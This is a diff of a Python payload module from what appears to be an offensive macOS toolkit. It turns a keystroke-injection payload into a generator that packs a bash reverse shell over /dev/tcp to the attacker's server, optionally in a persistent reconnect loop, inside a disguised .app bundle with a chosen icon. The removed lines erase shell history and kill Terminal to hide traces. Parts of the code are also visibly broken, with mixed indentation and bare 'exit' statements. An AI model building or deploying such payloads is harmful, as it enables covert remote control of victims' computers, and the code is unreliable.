@@ -23,46 +23,54 @@ import os, time
 
 class payload:
 	def __init__(self):
-		self.name = "Rubber Duck payload"
-		self.description = "Arduino payload that replicates keystrokes for shell script execution."
-		self.usage = "Install via ducktoolkit.com site."
+		self.name = "App macOS payload"
+		self.description = "Convert payload into the macOS Application."
+		self.usage = "Run this application."
 
 	def run(self,server):
 		while 1:
 			shell = raw_input(h.info_general_raw("Target Shell: ")).strip(" ")
-			persistence = raw_input(h.info_question_raw("Make Persistent? (y/N): ")).strip(" ").lower()
+                        icon = raw_input(h.info_general_raw("Application Icon: ")).strip(" ")
+			persistence = raw_input(h.info_question_raw("Make Persistent? (y/n): ")).strip(" ").lower()
 			if persistence == "y":
 				shell_command = "while true; do $("+shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
-				shell_clean = "history -wc;killall Terminal"
-				break
-			elif persistence == "n" or not persistence:
-				shell_command = shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
-				shell_clean = "history -wc;killall Terminal"
 				break
 			else:
-				h.info_error("Unrecognized option!")
-
-		shell_command += "history -wc;killall Terminal"
-		if os.path.exists("payloads") == False:
-			os.mkdir("payloads")
-		if os.path.exists("payloads/rubber_duck") == False:
-			os.mkdir("payloads/rubber_duck")
-		payload_save_path = "payloads/rubber_duck/payload.txt"
+				shell_command = shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
+				break
+		path = raw_input(h.info_general_raw("Output File: ")).strip(" ")
+		w = os.environ['OLDPWD']
+                os.chdir(w)
+		if os.path.isdir(path):
+		    if os.path.exists(path):
+			if path[:-1] == "/":
+			    payload_save_path = path + "payload.app"
+			else:
+			    payload_save_path = path + "/payload.app"
+		    else:
+			h.info_error("Local directory: "+path+": does not exist!")
+			exit
+		else:
+		    direct = os.path.split(path)[0]
+		    if os.path.exists(direct):
+			if os.path.isdir(direct):
+		            payload_save_path = path+"/Contents/MacOS/payload.sh"
+			else:
+			    h.info_error("Error: "+direct+": not a directory!")
+			    exit
+		    else:
+		        h.info_error("Local directory: "+direct+": does not exist!")
+		        exit
+		os.system("cp -r data/app/payload.app "+path+" > /dev/null")
+		os.system("mv "+icon+" "+path+"/Contents/Resources/payload.icns > /dev/null")
 		payload = """\
-DELAY 500
-COMMAND SPACE
-DELAY 500
-STRING terminal
-DELAY 500
-ENTER
-DELAY 500
-STRING """+shell_command+"""
-DELAY 500
-ENTER
-DELAY 500
-"""
+#! /usr/bin/env bash
+"""+shell_command
+		h.info_general("Saving to " + path + "...")
 		f = open(payload_save_path,"w")
 		f.write(payload)
 		f.close()
-		h.info_general("Payload saved to " + payload_save_path)
-
+		h.info_success("Saved to " + path + "!")
+		os.system("chmod +x "+path+"/Contents/MacOS/payload.sh")
+		g = os.environ['HOME']
+                os.chdir(g + "/mouse")
